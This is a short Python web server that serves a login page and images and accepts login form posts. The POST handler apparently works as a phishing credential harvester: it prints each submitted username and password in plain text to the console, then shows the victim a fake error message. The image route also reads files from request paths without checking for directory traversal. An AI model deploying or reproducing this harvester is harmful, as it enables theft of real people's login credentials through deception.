from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

class LoginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # give page
        if self.path == "/" or self.path == "/login.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("login.html", "rb") as f:
                self.wfile.write(f.read())

        # imige
        elif self.path.endswith(".png") or self.path.endswith(".jpg") or self.path.endswith(".jpeg") or self.path.endswith(".ico"):
            try:
                filepath = self.path.strip("/")
                if os.path.exists(filepath):
                    self.send_response(200)
                    if filepath.endswith(".png"):
                        self.send_header("Content-type", "image/png")
                    elif filepath.endswith(".jpg") or filepath.endswith(".jpeg"):
                        self.send_header("Content-type", "image/jpeg")
                    else:
                        self.send_header("Content-type", "application/octet-stream")
                    self.end_headers()
                    with open(filepath, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_error(404, "Image not found")
            except:
                self.send_error(500, "Internal server error")

        else:
            self.send_error(404, "File Not Found")

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode("utf-8")
            parsed_data = urllib.parse.parse_qs(post_data)

            username = parsed_data.get("username", [""])[0]
            password = parsed_data.get("password", [""])[0]

            print(f"\n[Login Attempt]")
            print(f"Username: {username}")
            print(f"Password: {password}\n")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h2>An error has occured.</h2>")
        else:
            self.send_error(404, "File Not Found")

if __name__ == "__main__":
    server_address = ("", 8000)
    httpd = HTTPServer(server_address, LoginHandler)
    print("Server running at http://localhost:8000")
    httpd.serve_forever()
